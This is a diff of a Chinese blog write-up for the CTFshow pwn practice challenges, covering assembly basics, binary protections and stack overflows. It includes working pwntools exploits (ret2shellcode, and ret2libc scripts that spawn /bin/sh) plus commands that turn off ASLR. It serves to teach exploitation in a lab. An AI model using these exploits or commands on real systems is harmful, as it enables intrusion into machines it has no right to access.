@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>haoo&#39;s tech blog - CTFshow pwn靶场练习</title>
-<meta name="description" content="Test_your_ncpwn0用题目描述的话，这是一道体验题目，感受一下pwn氛围，和传统pwn使用nc连接不一样，这道题目用ssh连接。 ssh是一种通过网络安全地连接和控制另一台计算机的方式，常用于远程管理服务器。比如这道题目 ssh ctfshow@pwn.challenge.ctf.show -p28111 ">
+<meta name="description" content="Test_your_ncpwn1 发现nc连接后可以直接获得flag。 pwn2 发现直接给了我们shell，只需要nc连接后并执行cat &amp;#x2F;ctfshow_flag命令即可获得flag。 pwn3 程序本身很简单，就是找到哪个函数能够获得flag。 直接选6即可获得flag。 但是在这里有一个迷惑选项4，就">
 <meta name="theme-color" content="#090c0b">
 <meta name="color-scheme" content="dark">
 <script>
@@ -75,7 +75,7 @@
     <article class="article-wrap">
       <header class="article-header">
         <div class="post-meta">
-          <span>27953 字</span>
+          <span>33547 字</span>
         </div>
         <h1>CTFshow pwn靶场练习</h1>
         
@@ -92,14 +92,97 @@
 
       <div class="article-grid">
         <div class="article-body article-prose" id="article-content">
-          <h1 id="Test-your-nc"><a href="#Test-your-nc" class="headerlink" title="Test_your_nc"></a>Test_your_nc</h1><h2 id="pwn0"><a href="#pwn0" class="headerlink" title="pwn0"></a>pwn0</h2><p>用题目描述的话，这是一道体验题目，感受一下pwn氛围，和传统pwn使用nc连接不一样，这道题目用ssh连接。</p>
-<p>ssh是一种通过网络安全地连接和控制另一台计算机的方式，常用于远程管理服务器。比如这道题目</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">ssh ctfshow@pwn.challenge.ctf.show -p28111<br></code></pre></td></tr></table></figure>
+          <h1 id="Test-your-nc"><a href="#Test-your-nc" class="headerlink" title="Test_your_nc"></a>Test_your_nc</h1><h2 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h2><p><img src="/../../../images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn1_1.png"></p>
+<p>发现nc连接后可以直接获得flag。</p>
+<p><img src="/../../../images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn1_2.png"></p>
+<h2 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h2><p><img src="/../../../images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn2_1.png"></p>
+<p>发现直接给了我们shell，只需要nc连接后并执行cat &#x2F;ctfshow_flag命令即可获得flag。</p>
+<p><img src="/../../../images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn2_2.png"></p>
+<h2 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h2><p><img src="/../../../images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn3_1.png"></p>
+<p>程序本身很简单，就是找到哪个函数能够获得flag。</p>
+<p><img src="/../../../images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn3_2.png"></p>
+<p><img src="/../../../images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn3_4.png"></p>
+<p>直接选6即可获得flag。</p>
+<p><img src="/../../../images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn3_3.png"></p>
+<p>但是在这里有一个迷惑选项4，就是echo &#x2F;ctfshow_flag命令。</p>
+<p><strong>echo命令：是Linux系统中的一个基础命令，用于在终端输出文本或变量值，常用于脚本中显示信息、调试或生成文件。常用选项：-n 不换行；-e 启用转义字符解释。高级用法：使用重定向将输出保存到文件，如echo “aaaa” &gt; output.txt；追加内容到文件，如echo “aaaa” &gt;&gt; output.txt。</strong></p>
+<p>因此当选择选项4时，并不会获得flag，而将打印出ctfshow_flag。</p>
+<h2 id="pwn4"><a href="#pwn4" class="headerlink" title="pwn4"></a>pwn4</h2><p><img src="/../../../images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn4_1.png"></p>
+<p><img src="/../../../images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn4_2.png"></p>
+<p>该程序将用户输入的字符串与原先已设定好的字符串进行比较，若相同，则调用execve函数获得shell。（具体用法在ret2syscall）</p>
+<p><img src="/../../../images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn4_3.png"></p>
+<h1 id="前置基础"><a href="#前置基础" class="headerlink" title="前置基础"></a>前置基础</h1><h2 id="pwn5-pwn12"><a href="#pwn5-pwn12" class="headerlink" title="pwn5-pwn12"></a>pwn5-pwn12</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">section .data<br>    msg db &quot;Welcome_to_CTFshow_PWN&quot;, 0<br><br>section .text<br>    global _start<br><br>_start:<br><br>; 立即寻址方式<br>    mov eax, 11         ; 将11赋值给eax<br>    add eax, 114504     ; eax加上114504<br>    sub eax, 1          ; eax减去1<br><br>; 寄存器寻址方式<br>    mov ebx, 0x36d      ; 将0x36d赋值给ebx<br>    mov edx, ebx        ; 将ebx的值赋值给edx<br><br>; 直接寻址方式<br>    mov ecx, msg      ; 将msg的地址赋值给ecx<br><br>; 寄存器间接寻址方式<br>    mov esi, msg        ; 将msg的地址赋值给esi<br>    mov eax, [esi]      ; 将esi所指向的地址的值赋值给eax<br><br>; 寄存器相对寻址方式<br>    mov ecx, msg        ; 将msg的地址赋值给ecx<br>    add ecx, 4          ; 将ecx加上4<br>    mov eax, [ecx]      ; 将ecx所指向的地址的值赋值给eax<br><br>; 基址变址寻址方式<br>    mov ecx, msg        ; 将msg的地址赋值给ecx<br>    mov edx, 2          ; 将2赋值给edx<br>    mov eax, [ecx + edx*2]  ; 将ecx+edx*2所指向的地址的值赋值给eax<br><br>; 相对基址变址寻址方式<br>    mov ecx, msg        ; 将msg的地址赋值给ecx<br>    mov edx, 1          ; 将1赋值给edx<br>    add ecx, 8          ; 将ecx加上8<br>    mov eax, [ecx + edx*2 - 6]  ; 将ecx+edx*2-6所指向的地址的值赋值给eax<br><br>; 输出字符串<br>    mov eax, 4          ; 系统调用号4代表输出字符串<br>    mov ebx, 1          ; 文件描述符1代表标准输出<br>    mov ecx, msg        ; 要输出的字符串的地址<br>    mov edx, 22         ; 要输出的字符串的长度<br>    int 0x80            ; 调用系统调用<br><br>; 退出程序<br>    mov eax, 1          ; 系统调用号1代表退出程序<br>    xor ebx, ebx        ; 返回值为0<br>    int 0x80            ; 调用系统调用<br><br></code></pre></td></tr></table></figure>
 
-<p>意思就是通过ssh连接到一台远程CTF服务器，ctfshow是登录用户名，pwn.challenge.ctf.show是服务器地址，-p 28111使用端口28111，连接上后输入密码，就登录成功了。因为这道题目考点是使用Linux命令跳转到其他目录下获得flag，这里就直接给出获得flag的步骤了</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">CTFshow荣誉出品<br>$ ls<br>$ pwd<br>/home/ctfshow<br>$ cd ..<br>$ ls<br>ctfshow<br>$ cd ..<br>$ ls<br>bin  boot  ctfshow_flag  dev  etc  home  lib  lib32  lib64  libx32  media  mnt  opt  proc  pwn  root  run  sbin  srv  sys  tmp  usr  var<br>$ pwd<br>/<br>$ cat ctfshow_flag<br>ctfshow&#123;d2321ca9-f144-41e6-a43e-cf91fa627b7e&#125;<br>$ <br>Connection to pwn.challenge.ctf.show closed.<br></code></pre></td></tr></table></figure>
+<p>这部分给了我们一个.asm文件以及一个与其对应的可执行文件，该部分主要让我们了解一些寄存器、寻址方式。</p>
+<p><strong>.asm文件：为汇编语言的源代码文件，常用于描述CPU的低级操作指令，它是机器指令的文本形式，直接与硬件交互。.asm文件通常用NASM汇编器编写，由于NASM汇编器与GCC工具链不是直接集成的，因此处理需要经过以下步骤：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">nasm -f elf xxx.asm    #生成一个xxx.o文件<br>ld -m elf_i386 -s -o xxx xxx.o    #将xxx.o文件链接成可执行文件<br></code></pre></td></tr></table></figure>
 
-<h2 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h2><h2 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h2><h2 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h2><h2 id="pwn4"><a href="#pwn4" class="headerlink" title="pwn4"></a>pwn4</h2><h1 id="前置基础"><a href="#前置基础" class="headerlink" title="前置基础"></a>前置基础</h1><h2 id="pwn5"><a href="#pwn5" class="headerlink" title="pwn5"></a>pwn5</h2><h2 id="pwn6"><a href="#pwn6" class="headerlink" title="pwn6"></a>pwn6</h2><h2 id="pwn7"><a href="#pwn7" class="headerlink" title="pwn7"></a>pwn7</h2><h2 id="pwn8"><a href="#pwn8" class="headerlink" title="pwn8"></a>pwn8</h2><h2 id="pwn9"><a href="#pwn9" class="headerlink" title="pwn9"></a>pwn9</h2><h2 id="pwn10"><a href="#pwn10" class="headerlink" title="pwn10"></a>pwn10</h2><h2 id="pwn11"><a href="#pwn11" class="headerlink" title="pwn11"></a>pwn11</h2><h2 id="pwn12"><a href="#pwn12" class="headerlink" title="pwn12"></a>pwn12</h2><h2 id="pwn13"><a href="#pwn13" class="headerlink" title="pwn13"></a>pwn13</h2><h2 id="pwn14"><a href="#pwn14" class="headerlink" title="pwn14"></a>pwn14</h2><h2 id="pwn15"><a href="#pwn15" class="headerlink" title="pwn15"></a>pwn15</h2><h2 id="pwn16"><a href="#pwn16" class="headerlink" title="pwn16"></a>pwn16</h2><h2 id="pwn17"><a href="#pwn17" class="headerlink" title="pwn17"></a>pwn17</h2><h2 id="pwn18"><a href="#pwn18" class="headerlink" title="pwn18"></a>pwn18</h2><h2 id="pwn19"><a href="#pwn19" class="headerlink" title="pwn19"></a>pwn19</h2><h2 id="pwn20"><a href="#pwn20" class="headerlink" title="pwn20"></a>pwn20</h2><h2 id="pwn21"><a href="#pwn21" class="headerlink" title="pwn21"></a>pwn21</h2><h2 id="pwn22"><a href="#pwn22" class="headerlink" title="pwn22"></a>pwn22</h2><h2 id="pwn23"><a href="#pwn23" class="headerlink" title="pwn23"></a>pwn23</h2><h2 id="pwn24"><a href="#pwn24" class="headerlink" title="pwn24"></a>pwn24</h2><h2 id="pwn25"><a href="#pwn25" class="headerlink" title="pwn25"></a>pwn25</h2><h2 id="pwn26"><a href="#pwn26" class="headerlink" title="pwn26"></a>pwn26</h2><h2 id="pwn27"><a href="#pwn27" class="headerlink" title="pwn27"></a>pwn27</h2><h2 id="pwn28"><a href="#pwn28" class="headerlink" title="pwn28"></a>pwn28</h2><h2 id="pwn29"><a href="#pwn29" class="headerlink" title="pwn29"></a>pwn29</h2><h2 id="pwn30"><a href="#pwn30" class="headerlink" title="pwn30"></a>pwn30</h2><h2 id="pwn31"><a href="#pwn31" class="headerlink" title="pwn31"></a>pwn31</h2><h2 id="pwn32"><a href="#pwn32" class="headerlink" title="pwn32"></a>pwn32</h2><h2 id="pwn33"><a href="#pwn33" class="headerlink" title="pwn33"></a>pwn33</h2><h2 id="pwn34"><a href="#pwn34" class="headerlink" title="pwn34"></a>pwn34</h2><h1 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h1><h2 id="pwn35"><a href="#pwn35" class="headerlink" title="pwn35"></a>pwn35</h2><p>首先checksec一下，看一下开启了哪些保护</p>
+<h2 id="pwn13"><a href="#pwn13" class="headerlink" title="pwn13"></a>pwn13</h2><p>这题主要考察gcc的一个使用</p>
+<p><img src="/../../../images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn13.png"></p>
+<h2 id="pwn14"><a href="#pwn14" class="headerlink" title="pwn14"></a>pwn14</h2><p>这题给了我们一个.c文件，主要是将二进制文件内容转换成二进制字符串形式，并以特点格式输出。</p>
+<p><img src="/../../../images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn14.png"></p>
+<p>需要先创建一个以key命名的文本文件，并在其里面写入CTFshow。</p>
+<h2 id="pwn15"><a href="#pwn15" class="headerlink" title="pwn15"></a>pwn15</h2><p>这题主要考察如何将.asm文件变为可执行文件。</p>
+<p><img src="/../../../images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn15.png"></p>
+<p><strong>这里需要注意的是操作系统不一样，编译与链接命令也不一样</strong>。</p>
+<h2 id="pwn16"><a href="#pwn16" class="headerlink" title="pwn16"></a>pwn16</h2><p>这题主要考察如何将.s文件变为可执行文件。</p>
+<p><img src="/../../../images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn16.png"></p>
+<p>其实.s文件与.asm文件都是汇编语言源代码文件，其核心区别在于语法和配套的汇编器。.s文件的默认汇编器为as，语法风格为AT&amp;T语法，而.asm文件的默认汇编器为nasm、MASM、FASM，语法风格为Intel语法</p>
+<h2 id="pwn17"><a href="#pwn17" class="headerlink" title="pwn17"></a>pwn17</h2><p><img src="/../../../iamges/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn17_1.png"></p>
+<p>该题是一道简单的菜单题，主要考察了我们Linux系统的一些指令使用。此题的话主要看2，3选项，其他的选项没有实质性的意义。</p>
+<p>选项3最后会执行system(“cat &#x2F;ctfshow_flag”)并获得flag，但问题是期间会sleep很久，又由于远程环境时间有限，因此不选该选项。</p>
+<p>选项2限制用户输入不超过10字节的字符串，并执行该字符串，因此我们可以直接输入&#x2F;bin&#x2F;sh获得shell，或者使用通配符*直接获取flag。</p>
+<p><img src="/../../../images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn17_2.png"></p>
+<h2 id="pwn18"><a href="#pwn18" class="headerlink" title="pwn18"></a>pwn18</h2><p>这题主要考察了对echo指令的了解</p>
+<p><img src="/../../../images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn18_1.png"></p>
+<p>主要是让我们判断哪一个是真的能获取到flag，有两个函数，一个是fake函数，一个是real函数。</p>
+<p><img src="/../../../images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn18_2.png"></p>
+<p><img src="/../../../images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn18_3.png"></p>
+<p>对于echo指令，&gt;表示的是将前面的内容替换文件中的内容并保存起来，&gt;&gt;表示的是将前面的内容追加到文件中内容的后面并保存起来。</p>
+<p>因此若选择real函数，那么flag is here将会代替&#x2F;ctfshow_flag文件中原有的内容，即flag，最后得到的就是flag is here；若选择fake函数，那么flag is here将会追加到&#x2F;ctfshow_flag文件中原有内容的后面，即flag后面加上flag is here，最后去掉flag is here就是flag。</p>
+<p><img src="/../../../images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn18_4.png"></p>
+<h2 id="pwn19"><a href="#pwn19" class="headerlink" title="pwn19"></a>pwn19</h2><p><img src="/../../../images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn19_1.png"></p>
+<p>该题使用了fclose()关闭文件输出流，接着让用户输入一串字符串，再执行该字符串。本题的难点在于关闭了输出流，那么无法标准输出，就需要进行输出重定向，将标准输出重定向到标准输入。</p>
+<p><img src="/../../../images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn19_2.png"></p>
+<h2 id="pwn20-pwn22"><a href="#pwn20-pwn22" class="headerlink" title="pwn20-pwn22"></a>pwn20-pwn22</h2><p>该题主要考察对<strong>RELRO保护</strong>的了解，其主要是通过限 制和保护**全局偏移表（GOT）<strong>和</strong>过程链接表（PLT）**的可写性来防止针对这些结构的攻击。</p>
+<p>该保护有三种状态：<strong>No RELRO，GOT和PLT均可写；Partial RELRO，GOT开头部分为只读，剩余部分仍可写；Full RELRO，GOT和PLT均为只读</strong>。</p>
+<h2 id="pwn23"><a href="#pwn23" class="headerlink" title="pwn23"></a>pwn23</h2><p>简单的一道溢出题目，使用ssh连接后运行程序造成溢出即可获得flag</p>
+<p><img src="/../../../images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn23.png"></p>
+<h2 id="pwn24"><a href="#pwn24" class="headerlink" title="pwn24"></a>pwn24</h2><p><img src="/../../../images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn24_1.png"></p>
+<p>该题没有开启NX保护且没有沙盒保护，因此可以直接打ret2shellcode，这里使用shellcraft模块编写shellcode更加方便。</p>
+<p><img src="/../../../images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn24_2.png"></p>
+<p>该题主要研究ctfshow函数，由于该函数无法跟进，就只能看汇编。首先调用__x86_get_pc_thunk_bx函数，将当前指令指针的值保存到ebx中，接着调用read函数，将输入的东西保存到缓冲区，然后再打印出来，最后执行缓冲区中存储的代码。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>context.arch=<span class="hljs-string">&#x27;i386&#x27;</span><br>io=remote(<span class="hljs-string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="hljs-number">28303</span>)<br><br>shellcode=asm(shellcraft.sh())<br>io.sendline(shellcode)<br><br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+<p><img src="/../../../images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn24_3.png"></p>
+<h2 id="pwn25"><a href="#pwn25" class="headerlink" title="pwn25"></a>pwn25</h2><p>一道简单的ret2libc，使用write泄漏libc基址。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span>*<br>elf=ELF(<span class="hljs-string">&#x27;./pwn25&#x27;</span>)<br>io=remote(<span class="hljs-string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="hljs-number">28165</span>)<br><br>write_plt=elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br>write_got=elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>main=elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br><br>payload1=cyclic(<span class="hljs-number">0x88</span>+<span class="hljs-number">4</span>)+p32(write_plt)+p32(main)+p32(<span class="hljs-number">1</span>)+p32(write_got)+p32(<span class="hljs-number">4</span>)<br>io.sendline(payload1)<br><br>write=u32(io.recv(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(write))<br><br>libc=LibcSearcher(<span class="hljs-string">&#x27;write&#x27;</span>,write)<br>libc_base=write-libc.dump(<span class="hljs-string">&#x27;write&#x27;</span>)<br>system=libc_base+libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>bin_sh=libc_base+libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br>payload2=cyclic(<span class="hljs-number">0x88</span>+<span class="hljs-number">4</span>)+p32(system)+p32(main)+p32(bin_sh)<br>io.sendline(payload2)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure>
+
+<p>这里使用的是LibcSearcher查找libc版本，当然若给了相应libc版本的文件，可以直接导入。</p>
+<h2 id="pwn26"><a href="#pwn26" class="headerlink" title="pwn26"></a>pwn26</h2><p>该题主要考察ASLR保护参数值的设置。使用下述指令将ASLR参数改为0，获得flag</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">echo 0 &gt; /proc/sys/kernel/randomize_va_space<br></code></pre></td></tr></table></figure>
+
+<p>ASLR保护即地址空间布局随机化（Address Space Layout Randomization），在Linux下通过&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space文件配置。ASLR工作主要有三个层次：0-完全关闭ASLR保护；1-部分随机化（栈的基地址、共享库的加载基地址、mmap基地址）2-完全随机化（包含1的所有随机化、随机化堆的基地址等等）。</p>
+<h2 id="pwn27"><a href="#pwn27" class="headerlink" title="pwn27"></a>pwn27</h2><p>使用下述指令将ASLR参数改为0或1，获得flag</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">echo 0 &gt; /proc/sys/kernel/randomize_va_space<br>echo 1 &gt; /proc/sys/kernel/randomize_va_space<br></code></pre></td></tr></table></figure>
+
+<p><img src="/../../../images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn27.png"></p>
+<h2 id="pwn28"><a href="#pwn28" class="headerlink" title="pwn28"></a>pwn28</h2><p>使用下述指令将ASLR参数改为0或1或2，获得flag</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">echo 0 &gt; /proc/sys/kernel/randomize_va_space<br>echo 1 &gt; /proc/sys/kernel/randomize_va_space<br>echo 2 &gt; /proc/sys/kernel/randomize_va_space<br></code></pre></td></tr></table></figure>
+
+<p><img src="/../../../images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn28.png"></p>
+<h2 id="pwn29"><a href="#pwn29" class="headerlink" title="pwn29"></a>pwn29</h2><p>该题就是感受一下ASLR与PIE同时开启后的地址是什么样的，但是随机的都仅仅是某个对象的起始地址，内部结构没变，也就是相对偏移不会变，因此在后续遇到开启了PIE保护的题目，就得先找到基址，然后通过相对偏移算出所需地址即可。</p>
+<h2 id="pwn30"><a href="#pwn30" class="headerlink" title="pwn30"></a>pwn30</h2><p>也是一道ret2libc的题目</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span>*<br>elf=ELF(<span class="hljs-string">&#x27;./pwn30&#x27;</span>)<br>io=remote(<span class="hljs-string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="hljs-number">28232</span>)<br><br>write_plt=elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br>write_got=elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>main=elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br><br>payload1=cyclic(<span class="hljs-number">0x88</span>+<span class="hljs-number">4</span>)+p32(write_plt)+p32(main)+p32(<span class="hljs-number">1</span>)+p32(write_got)+p32(<span class="hljs-number">4</span>)<br>io.sendline(payload1)<br><br>write=u32(io.recv(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(write))<br><br>libc=LibcSearcher(<span class="hljs-string">&#x27;write&#x27;</span>,write)<br>libc_base=write-libc.dump(<span class="hljs-string">&#x27;write&#x27;</span>)<br>system=libc_base+libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>bin_sh=libc_base+libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br>payload2=cyclic(<span class="hljs-number">0x88</span>+<span class="hljs-number">4</span>)+p32(system)+p32(main)+p32(bin_sh)<br>io.sendline(payload2)<br><br>io.interactive()<br><br><br></code></pre></td></tr></table></figure>
+
+<h2 id="pwn31"><a href="#pwn31" class="headerlink" title="pwn31"></a>pwn31</h2><p>一道开启了PIE保护的题目</p>
+<p><img src="/../../../images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn31_1.png"></p>
+<p><img src="/../../../images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn31_2.png"></p>
+<p>题目直接给了我们main函数的地址，可以接收该地址，接着可以算出基址，然后就没什么难点了。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>from LibcSearcher import*<br>context.log_level=&#x27;debug&#x27;<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28311)<br>elf=ELF(&#x27;./pwn31&#x27;)<br><br>main=int(io.recvline(),16)<br>print(hex(main))<br><br>addr_base=main-elf.sym[&#x27;main&#x27;]<br>write_plt=addr_base+elf.sym[&#x27;write&#x27;]<br>write_got=addr_base+elf.got[&#x27;write&#x27;]<br>ctfshow=addr_base+elf.sym[&#x27;ctfshow&#x27;]<br>ebx=addr_base+0x1fc0<br><br>payload1=b&#x27;a&#x27;*132+p32(ebx)+b&#x27;aaaa&#x27;+p32(write_plt)+p32(ctfshow)+p32(1)+p32(write_got)+p32(4)<br>io.sendline(payload1)<br><br>write=u32(io.recv(4))<br>print(hex(write))<br>libc=LibcSearcher(&#x27;write&#x27;,write)<br>libc_base=write-libc.dump(&#x27;write&#x27;)<br>system=libc_base+libc.dump(&#x27;system&#x27;)<br>bin_sh=libc_base+libc.dump(&#x27;str_bin_sh&#x27;)<br><br>payload2=cyclic(0x88+4)+p32(system)+p32(ctfshow)+p32(bin_sh)<br>io.sendline(payload2)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure>
+
+<h2 id="pwn32-pwn34"><a href="#pwn32-pwn34" class="headerlink" title="pwn32-pwn34"></a>pwn32-pwn34</h2><p>这三道题主要介绍了<strong>FORTIFY_SOURCE保护机制，旨在防止缓冲区溢出和其它与字符串和内存操作相关的安全漏洞，其是在编译时自动插入一组额外代码，用于增强程序对于缓冲区溢出和其他常见安全问题的防护。FORTIFY_SOURCE主要有：运行时长度检查、缓冲区溢出检测、安全警告和错误报告。不同的级别，开启的保护机制是不一样的。</strong></p>
+<h1 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h1><h2 id="pwn35"><a href="#pwn35" class="headerlink" title="pwn35"></a>pwn35</h2><p>首先checksec一下，看一下开启了哪些保护</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">[*] &#x27;/mnt/d/CTF/ctfshow pwn入门/pwn35&#x27;<br>    Arch:       i386-32-little<br>    RELRO:      Partial RELRO<br>    Stack:      No canary found<br>    NX:         NX enabled<br>    PIE:        No PIE (0x8048000)<br>    Stripped:   No<br></code></pre></td></tr></table></figure>
 <p>很常规的一些保护，没什么看的，直接进入ida里面进行分析</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">int __cdecl main(int argc, const char **argv, const char **envp)<br>&#123;<br>  FILE *stream; // [esp+0h] [ebp-1Ch]<br><br>  stream = fopen(&quot;/ctfshow_flag&quot;, &quot;r&quot;);<br>  if ( !stream )<br>  &#123;<br>    puts(&quot;/ctfshow_flag: No such file or directory.&quot;);<br>    exit(0);<br>  &#125;<br>  fgets(flag, 64, stream);<br>  signal(11, (__sighandler_t)sigsegv_handler);<br>  puts(asc_8048910);<br>  puts(asc_8048984);<br>  puts(asc_8048A00);<br>  puts(asc_8048A8C);<br>  puts(asc_8048B1C);<br>  puts(asc_8048BA0);<br>  puts(asc_8048C34);<br>  puts(&quot;    * *************************************                           &quot;);<br>  puts(aClassifyCtfsho);<br>  puts(&quot;    * Type  : Stack_Overflow                                          &quot;);<br>  puts(&quot;    * Site  : https://ctf.show/                                       &quot;);<br>  puts(&quot;    * Hint  : See what the program does!                              &quot;);<br>  puts(&quot;    * *************************************                           &quot;);<br>  puts(&quot;Where is flag?\n&quot;);<br>  if ( argc &lt;= 1 )<br>  &#123;<br>    puts(&quot;Try again!&quot;);<br>  &#125;<br>  else<br>  &#123;<br>    ctfshow((char *)argv[1]);<br>    printf(&quot;QaQ!FLAG IS NOT HERE! Here is your input : %s&quot;, argv[1]);<br>  &#125;<br>  return 0;<br>&#125;<br>char *__cdecl ctfshow(char *src)<br>&#123;<br>  char dest[104]; // [esp+Ch] [ebp-6Ch] BYREF<br><br>  return strcpy(dest, src);<br>&#125;<br></code></pre></td></tr></table></figure>
